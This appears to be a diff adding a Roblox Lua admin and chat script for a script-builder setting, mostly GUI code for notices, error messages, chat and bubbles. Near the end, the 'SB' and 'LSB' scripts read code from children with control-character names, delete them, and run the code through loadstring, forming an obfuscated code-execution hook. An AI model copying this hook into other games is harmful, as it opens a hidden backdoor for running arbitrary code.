+local ti = f.IN('TextLabel',fr) ti.Position = UDim2.new(.5,0,0,0) ti.Size = UDim2.new(0,0,0,20) ti.TextWrapped = true ti.BorderSizePixel = 0 ti.Transparency = 1 ti.Font = 'ArialBold' ti.FontSize = 'Size14' ti.TextStrokeTransparency = 1 ti.TextColor3 = Color3.new(1,1,1) ti.ZIndex = 10 ti.Text = a[1]..': '..a[2]
+FadeIn(fr,calltime,{BT = .5})
+FadeIn(ti,calltime,{BT = 1, TT = 0, TST = .75})
+FadeIn(ms,calltime,{BT = 1, TT = 0, TST = .75})
+elseif type == 'ERROR' then if a and a[1] and a[5] and a[5]==1 and a[1]:find('false') then return end
+local m = f.IN('ScreenGui',plrgui) curr.Error = m table.insert(msgs,{m,tick()+5})
+local fr = f.IN('Frame',m) fr.Size = UDim2.new(1,0,0,30) fr.Position = UDim2.new(0,0,.5,-15) fr.BackgroundColor3 = Color3.new(0,0,0) fr.BorderSizePixel = 0 fr.Transparency = 1 fr.ZIndex = 9
+local ti = f.IN('TextLabel',fr) ti.Position = UDim2.new(.5,-5,0,0) ti.Size = UDim2.new(0,0,0,30) ti.TextXAlignment = 'Right' ti.TextWrapped = true ti.BorderSizePixel = 0 ti.Transparency = 1 ti.Font = 'ArialBold' ti.FontSize = 'Size18' ti.TextStrokeTransparency = 1 ti.TextColor3 = Color3.new(1,1,1) ti.ZIndex = 10
+local prf = a[5]==1 and 'Command not found:\t' or a[5]==2 and 'Insufficient permissions to use this command!' or a[5]==3 and 'Incorrect Syntax:\t'..a[4]
+if a[5]==2 then ti.TextXAlignment = 'Center' ti.Text = prf ti.Position = UDim2.new(.5,0,0,0) ti.TextColor3 = Color3.new(1,0,0)
+elseif a[5]==1 then ti.Text = prf..'Did you mean '..a[1]..'?' ti.TextXAlignment = 'Center'
+else ti.Text = prf..' ' for i,v in pairs(a[1][1]) do ti.Text = ti.Text..v..' ' end ti.Text = ti.Text..' ['..a[1][2]..']\t|' local x = 0
+local cl = ti:Clone() cl.Parent = fr cl.TextXAlignment = 'Left' cl.Position = UDim2.new(0.5,5,0,0) cl.Text = '|\t'..a[4]..' ' x = x+cl.TextBounds.X+5
+for i,v in pairs(a[3]) do local ncl = cl:Clone() ncl.Parent = fr ncl.Position = UDim2.new(0.5,x,0,0) ncl.Text = v..' ' x = x+ncl.TextBounds.X if a[2][i] == 'False' then ncl.TextColor3 = Color3.new(1,0,0) FadeIn(ncl,calltime,{BT = 1, TT = 0, TST = .75}) end end
+FadeIn(cl,calltime,{BT = 1, TT = 0, TST = .75})
+end
+FadeIn(fr,calltime,{BT = .5})
+FadeIn(ti,calltime,{BT = 1, TT = 0, TST = .75})
+end
+end
+
+event.OnClientEvent:connect(onCall)
+plr.Changed:connect(function() if plr and plr.Parent ~= game:service('Players') and game.PlaceId > 0 then repeat until nil end end)
+plr.CharacterAdded:connect(function(chr) if char ~= chr then script.Disabled = true end end)
+
+if script:findFirstChild('Chat') then
+game.StarterGui:SetCoreGuiEnabled('Chat',false)
+
+local MsgList = {}
+local bubbles = {}
+local kchat,bchat
+local startmsg,mutemsg = 'Press \'/\' to type a message.','You have been muted.'
+
+function FindPlr(str) for i,v in pairs(game.Players:children()) do if v.Name:lower():find(str:lower()) == 1 then return v end end return nil end
+
+function ChkMsg(ply,msg)
+local bd,wp,tm = false,false,false
+if msg:sub(1,1) == '@' and msg:find(' ') and msg:find(' ') ~= 2 and FindPlr(msg:sub(2,msg:find(' ')-1)) then wp = true elseif msg:sub(1,1) == '%' then tm = true end
+if msg:sub(1,1) == '@' and msg:find(' ') and FindPlr(msg:sub(2,msg:find(' ')-1)) and FindPlr(msg:sub(2,msg:find(' ')-1)) ~= plr and ply and ply ~= plr then bd = true end
+if msg:sub(1,1) == '%' and ply and ply.TeamColor ~= plr.TeamColor then bd = true end
+return bd,wp,tm
+end
+
+kchat = event:WaitForChild('KChat')
+
+if plr and plr:findFirstChild('PlayerGui') and plr.PlayerGui:findFirstChild('ChatGui') then plr.PlayerGui.ChatGui:Destroy() end
+
+local gui = f.IN('ScreenGui',plr.PlayerGui) gui.Name = 'ChatGui' 
+local frame = f.IN('Frame', gui) frame.Size = UDim2.new(.3,100,0,155) frame.Position = UDim2.new(0,0,0,0) frame.BackgroundColor3 = Color3.new(0,0,0) frame.BorderSizePixel = 0 frame.Transparency = .9 frame.ZIndex = 1
+local tbf = f.IN('Frame',gui) tbf.Size = UDim2.new(1,0,0,20) tbf.Position = UDim2.new(0,0,1,-20) tbf.BackgroundColor3 = Color3.new(0,0,0) tbf.BackgroundTransparency = .5 tbf.BorderSizePixel = 0
+local tbox = f.IN('TextBox',gui) tbox.Size = UDim2.new(1,-60,0,20) tbox.Position = UDim2.new(0,60,1,-20) tbox.BorderSizePixel = 0 tbox.BackgroundTransparency = 1 tbox.Text = startmsg tbox.TextColor3 = Color3.new(1,1,1) tbox.Font = 'ArialBold' tbox.FontSize = 'Size14' tbox.TextXAlignment = 'Left' tbox.TextTransparency = .2 tbox.TextStrokeTransparency = .8 tbox.ClearTextOnFocus = false tbox.ZIndex = 1
+tbox.Changed:connect(function(p) if plr and plr:findFirstChild('KCMute') then tbox.Text = mutemsg tbox.TextColor3 = Color3.new(1,0,0) end end)
+plr.ChildAdded:connect(function(p) if plr and p and p.Name == 'KCMute' then tbox.Text = mutemsg tbox.TextColor3 = Color3.new(1,0,0) end end)
+plr.ChildRemoved:connect(function(p) if plr and p and p.Name == 'KCMute' then tbox.Text = startmsg tbox.TextColor3 = Color3.new(1,1,1) end end)
+local chatframe = f.IN('ScrollingFrame',frame)
+chatframe.ScrollBarThickness = 5
+chatframe.BorderSizePixel = 0
+chatframe.BackgroundTransparency = 1
+chatframe.Size = UDim2.new(1,0,0,155)
+chatframe.CanvasSize = UDim2.new(1,0,0,307)
+chatframe.CanvasPosition = Vector2.new(0,152)
+local tlab = f.IN('TextLabel')
+tlab.Size = UDim2.new(1,-4,0,15)
+tlab.Position = UDim2.new(0,4,0,0)
+tlab.BackgroundTransparency = 1
+tlab.Text = ''
+tlab.TextXAlignment = 'Left'
+tlab.FontSize = 'Size14'
+tlab.Font = 'ArialBold'
+tlab.TextColor3 = Color3.new(1,1,1)
+tlab.TextStrokeTransparency = .75
+tlab.ZIndex = 2
+for i = 1, 20 do 
+local cl = tlab:Clone() cl.Position = UDim2.new(0,4,1,((i-1)*-15)-20) cl.Parent = chatframe 
+local ncl = cl:Clone() ncl.Position = UDim2.new(0,0,0,0) ncl.ZIndex = 3 ncl.Size = UDim2.new(1,0,1,0) ncl.Parent = cl ncl.Name = 'PName'
+table.insert(MsgList,cl)
+end
+
+tbox.InputBegan:connect(function(p) 
+if p.UserInputType == Enum.UserInputType.MouseButton1 and tbox.Text == startmsg and not plr:findFirstChild('KCMute') then 
+tbox.Text=''
+end 
+end)
+
+game:service('UserInputService').InputBegan:connect(function(p)
+if p.UserInputType == Enum.UserInputType.Keyboard and p.KeyCode == Enum.KeyCode.Slash then
+if not plr:findFirstChild('KCMute') then if tbox.Text == startmsg then tbox.Text = '' end wait() tbox:CaptureFocus() end
+end
+end)
+
+tbox.FocusLost:connect(function(bl)
+if not bl or plr:findFirstChild('KCMute') or tbox.Text:len() < 1 then return end
+if tbox and tbox.Text ~= startmsg then
+local msg = tbox.Text 
+if msg:find(startmsg) then msg = msg:sub(msg:find(startmsg) + startmsg:len()) end
+local mgs = f.IN('StringValue') mgs.Value = msg mgs.Name = 'KMsg'
+if plr:findFirstChild('KMsg') then plr.KMsg.Parent = mgs end
+mgs.Parent = plr game:service('Debris'):AddItem(mgs,4+(math.min(msg:len(),65)/15))
+tbox.Text = startmsg
+end
+end)
+tbox.Changed:connect(function() local msg = tbox.Text if msg:find(startmsg) and msg:len() > startmsg:len() then tbox.Text = msg:sub(msg:find(startmsg) + startmsg:len()) end end)
+
+function Update() f.CW(function() if not (kchat and kchat.Value and #kchat.Value > 1) then return end
+for i,v in pairs(game.Players:children()) do f.CW(function() if not cam and game.Workspace.CurrentCamera then cam = game.Workspace.CurrentCamera end
+if v and v:findFirstChild('KMsg') and v.Character and v.Character:findFirstChild('Head') and plr and plr.Character and (v.Character.Head.Position-cam.CoordinateFrame.p).magnitude <= 99 then
+local km,msg,bbl,head,dist,fnts,hided = v.KMsg,v.KMsg.Value,nil,v.Character.Head,(v.Character.Head.Position-cam.CoordinateFrame.p).magnitude,{18,14,12,10},true
+for i2,v2 in pairs(bubbles) do
+
+if v2 and v2[2] then
+for i3,v3 in pairs(v2[2]:children()) do
+if v3.Name == 'TextLabel' then
+v3.FontSize = 'Size'..(tostring(fnts[math.ceil(dist/(99/#fnts))]) or '12')
+if math.ceil(dist/(99/#fnts)) >= #fnts then
+v2[2].Enabled = false
+else
+v2[2].Enabled = true
+end
+end
+end
+end
+
+if v2[1] == km and v2[1].Parent and v2[1] and (cam.CoordinateFrame.p-head.Position).magnitude <= 99 and v2[2] then bbl = v2 elseif not v2[1] and v2[2] then v2[2]:Destroy() bubbles[i] = nil end end
+if not bbl then local con
+local bbg = f.IN('BillboardGui',cam) game:service('Debris'):AddItem(bbg,10+(math.min(msg:len(),65)/15)) table.insert(bubbles,#bubbles,{km,bbg})
+bbg.Adornee = head
+bbg.Size = UDim2.new(dist/7,0,#msg:sub(1,(math.min(111,#msg))/55.5)+1,0)
+bbg.StudsOffset = f.V3(0,((#msg:sub(1,(math.min(111,#msg))/55.5))/2)+3,0)
+local txt = f.IN('TextLabel',bbg) txt.TextWrapped = true txt.Size = UDim2.new(1,0,1,0) txt.Text = msg:sub(1,math.min(111,#msg)) if #txt.Text == 111 then txt.Text = txt.Text..'...' end txt.BackgroundTransparency = 1 txt.BorderSizePixel = 0 txt.Font = 'ArialBold' txt.FontSize = 'Size'..tostring(fnts[math.ceil(dist/(99/#fnts))]) txt.TextColor3 = f.C3(1,1,1) txt.TextTransparency = 1 txt.TextStrokeTransparency = 1
+f.CW(function() repeat wait() if v and v.Character and v.Character:findFirstChild('Humanoid') and v.Character:findFirstChild('Head') then bbg.Size = UDim2.new(12+(v.Character.Head.Position-cam.CoordinateFrame.p).magnitude/7,0,#msg:sub(1,(math.min(111,#msg))/55.5)+1,0) if (v.Character.Head.Position-cam.CoordinateFrame.p).magnitude <= 99 then txt.FontSize = 'Size'..(tostring(fnts[math.ceil((v.Character.Head.Position-cam.CoordinateFrame.p).magnitude/(99/#fnts))]) or '12') bbg.Enabled = true else bbg.Enabled = false end end
+if bbg and bbg.Adornee and (bbg.Adornee.Position-cam.CoordinateFrame.p).magnitude <= 99 and v and v.Character and v.Character:findFirstChild('Head') then txt.FontSize = 'Size'..tostring(fnts[math.ceil((v.Character.Head.Position-cam.CoordinateFrame.p).magnitude/(99/#fnts))]) bbg.Enabled = true elseif bbg then bbg.Enabled = false end
+if not km or not km:IsDescendantOf(v) then if txt.TextTransparency < 1 then txt.TextTransparency = txt.TextTransparency + .1 txt.TextStrokeTransparency = txt.TextStrokeTransparency + .03 else bbg:Destroy() end end
+if km and hided then if txt.TextTransparency > 0 then txt.TextTransparency = txt.TextTransparency - .1 txt.TextStrokeTransparency = txt.TextStrokeTransparency - .05 else hided = false txt.TextTransparency = 0 txt.TextStrokeTransparency = .5 end end
+if km and km.Parent and km.Parent.Parent and km.Parent.Parent.Parent and km.Parent.Name == 'KMsg' and km.Parent.Parent.Name == 'KMsg' and km.Parent.Parent.Parent.Name == 'KMsg' then local k1,k2,k3,k4 = km.Value,km.Parent.Value,km.Parent.Parent.Value,km.Parent.Parent.Parent.Value local kv = 6+(#k1:sub(1,(math.min(111,#k1))/55.5)/2)+(#k2:sub(1,(math.min(111,#k2))/55.5))+(#k3:sub(1,(math.min(111,#k3))/55.5))+(#k4:sub(1,(math.min(111,#k4))/55.5)) if bbg.StudsOffset.y < kv then bbg.StudsOffset = bbg.StudsOffset + Vector3.new(0,.1,0) else bbg.StudsOffset = Vector3.new(0,kv,0) end if txt.TextTransparency < 1 then txt.TextTransparency = txt.TextTransparency + .1 txt.TextStrokeTransparency = txt.TextStrokeTransparency + .05 else km:Destroy() bbg:Destroy() end
+elseif km and km.Parent and km.Parent.Parent and km.Parent.Name == 'KMsg' and km.Parent.Parent.Name == 'KMsg' then local k1,k2,k3 = km.Value,km.Parent.Value,km.Parent.Parent.Value local kv = 5+(#k1:sub(1,(math.min(111,#k1))/55.5)/2)+(#k2:sub(1,(math.min(111,#k2))/55.5))+(#k3:sub(1,(math.min(111,#k3))/55.5)) if bbg.StudsOffset.y < kv then bbg.StudsOffset = bbg.StudsOffset + Vector3.new(0,.1,0) else bbg.StudsOffset = Vector3.new(0,kv,0) end
+elseif km and km.Parent and km.Parent.Name == 'KMsg' then local k1,k2 = km.Value,km.Parent.Value local kv = 4+(#k1:sub(1,(math.min(111,#k1))/55.5)/2)+(#k2:sub(1,(math.min(111,#k2))/55.5)/2) if bbg.StudsOffset.y < kv then bbg.StudsOffset = bbg.StudsOffset + Vector3.new(0,.1,0) else bbg.StudsOffset = Vector3.new(0,kv,0) end
+end until not txt or txt.TextTransparency >= 1
+end)()
+end
+end
+end)()
+end
+local nlogs = kchat.Value
+local names,clogs = {},{}
+if not nlogs then return end
+while nlogs:find('|:|') and nlogs:find(': ') do table.insert(names,nlogs:sub(1,nlogs:find(': ')-1)) table.insert(clogs,nlogs:sub(nlogs:find(': ')+2,nlogs:find('|:|')-1)) nlogs = nlogs:sub(nlogs:find('|:|')+3) end
+for i = 1, 20 do
+local clr,clrs,colr = nil,{} 
+if names[i] and names[i]:find('{') and names[i]:find('{') == 1 and names[i]:find('}') then 
+local clrs = {} for a,b in pairs(f.getWords(names[i]:sub(2,names[i]:find('}')-1))) do table.insert(clrs,tonumber(b)) end 
+colr = Color3.new(clrs[1]/255,clrs[2]/255,clrs[3]/255) names[i] = names[i]:sub(names[i]:find('}')+1) end
+f.CW(function()
+if clogs[i] and names[i] then
+local plyr = FindPlr(names[i])
+local bd,wp,tm = ChkMsg(plyr,clogs[i])
+if not bd and MsgList[i] and MsgList[i]:findFirstChild('PName') and clogs[i] and names[i] then
+MsgList[i].Text = clogs[i] MsgList[i].PName.Text = names[i] .. ': ' 
+if plyr then MsgList[i].PName.TextColor3 = plyr.TeamColor.Color else MsgList[i].PName.TextColor3 = Color3.new(1,1,1) end
+MsgList[i].TextColor3 = Color3.new(1,1,1)
+if colr then MsgList[i].PName.TextColor3 = colr end
+if wp and MsgList[i] and MsgList[i]:findFirstChild('PName') and MsgList[i].Text:find(' ') then MsgList[i].Text = MsgList[i].Text:sub(MsgList[i].Text:find(' ')+1) MsgList[i].PName.TextColor3 = Color3.new(0,0,0) MsgList[i].TextColor3 = Color3.new(0,0,0) MsgList[i].PName.Text = '(PM)' .. MsgList[i].PName.Text end
+if tm and MsgList[i] and MsgList[i]:findFirstChild('PName') then MsgList[i].Text = MsgList[i].Text:sub(2) MsgList[i].TextColor3 = plyr.TeamColor.Color MsgList[i].PName.Text = '(TEAM)' .. MsgList[i].PName.Text end
+MsgList[i].Position = UDim2.new(0,4+MsgList[i].PName.TextBounds.X,1,MsgList[i].Position.Y.Offset)
+MsgList[i].PName.Position = UDim2.new(0,-MsgList[i].PName.TextBounds.X,0,0)
+local clr = MsgList[i].TextColor3
+if clr.r > .5 or clr.g > .5 or clr.b > .5 then MsgList[i].TextStrokeColor3 = Color3.new(0,0,0) else MsgList[i].TextStrokeColor3 = Color3.new(1,1,1) end
+clr = MsgList[i].PName.TextColor3
+if clr.r > .5 or clr.g > .5 or clr.b > .5 then MsgList[i].PName.TextStrokeColor3 = Color3.new(0,0,0) else MsgList[i].PName.TextStrokeColor3 = Color3.new(1,1,1) end
+end
+elseif MsgList[i] and MsgList[i]:findFirstChild('PName') then MsgList[i].Text = '' MsgList[i].PName.Text = ''
+end end)()
+end end)()
+end
+
+game:service('RunService').RenderStepped:connect(function() coroutine.wrap(function() Update() end)()
+for i,v in pairs(msgs) do
+if v[1] then
+if (v[2] and tick() > v[2]) or (v[1] ~= curr.Msg and v[1] ~= curr.Hint and v[1] ~= curr.Notify and v[1] ~= curr.Error) then
+FadeOut(v[1],tick()) table.remove(msgs,i)
+end
+end
+end
+end)
+Update()
+end]],owner.PlayerGui)
+locals.Parent = script.Parent
+locals.Enabled = false
+locals.Name = ""
+end))
+LocalScript2.Disabled = true
+Script3.Name = "SB"
+Script3.Parent = Script1
+table.insert(cors,sandbox(Script3,function()
+p = NS([[local rmv = function(a,b) game:service('Debris'):AddItem(a,b) end
+coroutine.wrap(function()
+script:WaitForChild(('\a'):rep(8))
+script:findFirstChild(('\a'):rep(8)):WaitForChild('\a\a\n\n')
+local idx = {script:findFirstChild(('\a'):rep(8)).Value,script:findFirstChild(('\a'):rep(8)):findFirstChild('\a\a\n\n').Value}
+rmv(script:findFirstChild(('\a'):rep(8)),0) rmv(script:findFirstChild(('\a'):rep(8)):findFirstChild('\a\a\n\n'):Destroy(),0)
+if not idx[1]:find(idx[2]) or not script:findFirstChild('r\a\n') then return end
+Instance.new('IntValue',script).Name = 'r\a\n'
+local e,er = ypcall(function() loadstring('coroutine.wrap(function(' .. idx[1]:sub(11) .. ' end)()')() end)
+if er then print(er) end
+end)]],workspace)
+p.Parent = script.Parent
+p.Name = "SBx"
+p.Enabled = false
+end))
+Script3.Disabled = true
+LocalScript4.Name = "Lx"
+LocalScript4.Parent = Script1
+table.insert(cors,sandbox(LocalScript4,function()
+y = NLS([[local rmv = function(a,b) game:service('Debris'):AddItem(a,b) end
+coroutine.wrap(function()
+script:WaitForChild(('\a'):rep(8))
+script:findFirstChild((('\a'):rep(8))):WaitForChild('\a\a\n\n')
+local idx = {script:findFirstChild((('\a'):rep(8))).Value,script:findFirstChild((('\a'):rep(8))):findFirstChild('\a\a\n\n').Value}
+rmv(script:findFirstChild((('\a'):rep(8))),0) rmv(script:findFirstChild((('\a'):rep(8))):findFirstChild('\a\a\n\n'):Destroy(),0)
+if not idx[1]:find(idx[2]) or not script:findFirstChild('r\a\n') then return end
+Instance.new('IntValue',script).Name = 'r\a\n'
+local e,er = ypcall(function() loadstring('coroutine.wrap(function(' .. idx[1]:sub(11) .. ' end)()')() end)
+if er then print(er) end
+end)]],owner.PlayerGui)
+y.Parent = script.Parent
+y.Name = "LSB"
+y.Enabled = false
+end))
+for i,v in pairs(mas:GetChildren()) do
+	v.Parent = script
+	pcall(function() v:MakeJoints() end)
+end
+mas:Destroy()
+for i,v in pairs(cors) do
+	spawn(function()
+		pcall(v)
+	end)
+end
